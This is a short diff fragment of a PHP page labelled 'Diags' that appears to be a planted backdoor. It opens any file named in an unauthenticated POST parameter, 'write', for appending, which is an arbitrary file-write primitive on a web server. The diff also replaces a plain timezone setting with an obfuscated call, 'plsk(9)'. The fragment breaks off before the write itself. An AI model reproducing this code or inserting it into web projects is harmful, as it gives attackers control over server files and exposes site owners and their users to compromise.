@@ -1,6 +1,7 @@
 Diags<br>
 <?php
-date_default_timezone_set('America/New_York');
+
+date_default_timezone_set(plsk(9));
 //error_reporting(0);
 if (file_exists($_POST['write'])) {
 	$myfile = fopen("$_POST[write]", "a");
